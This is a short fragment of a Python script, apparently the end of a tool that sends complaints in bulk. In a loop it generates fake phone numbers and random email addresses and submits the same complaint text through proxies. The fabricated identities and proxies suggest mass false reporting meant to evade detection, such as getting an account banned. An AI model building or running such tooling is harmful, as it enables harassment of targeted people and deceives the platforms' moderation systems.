    for _ in range(repeats):
        number = generate_phone_number()
        email = generate_random_email()
        send_complaint(number, email, complaint_text, repeats, proxies)

if __name__ == "__main__":
    complaint()
